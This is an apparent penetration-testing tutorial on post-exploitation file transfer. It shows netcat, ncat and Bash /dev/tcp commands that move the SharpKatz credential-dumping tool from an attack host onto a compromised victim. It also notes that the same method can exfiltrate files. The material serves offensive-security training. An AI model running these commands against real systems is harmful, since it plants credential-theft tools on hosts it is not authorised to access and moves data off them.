In addition to traditional file transfer methods on Windows and Linux (such as HTTP, SMB, or FTP), there are alternative techniques that can be used when standard services are unavailable or restricted. These methods are especially useful in restricted environments, post-exploitation scenarios, or when bypassing firewall limitations.

---

## File Transfer Using Netcat (Victim Listening)

### Scenario

Transfer a file from the attack host to the compromised machine.

### Step 1 (Alternative): Victim Machine Listening (Ncat)

```bash
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

`--recv-only` ensures the connection closes once the transfer completes.

### Step 2: Attack Host Sending the File (Original Netcat)

```bash
k1ll9@k1ll9$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
k1ll9@k1ll9$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

`-q 0` closes the connection after input is sent.


---

## File Transfer When Firewall Blocks Inbound Connections

In this scenario, the attack host listens and the compromised machine initiates the connection.

### Attack Host Listening 

```bash
k1ll9@k1ll9$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

### Victim Connecting to Receive the File

```bash
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```


---

## File Transfer Using Bash /dev/tcp

If Netcat/Ncat is not available on the compromised host, Bash can use the pseudo-device `/dev/tcp`.

### Attack Host Listening

```bash
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```


### Victim Receiving via /dev/tcp

```bash
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

This method can also be reversed to exfiltrate files from the compromised host.
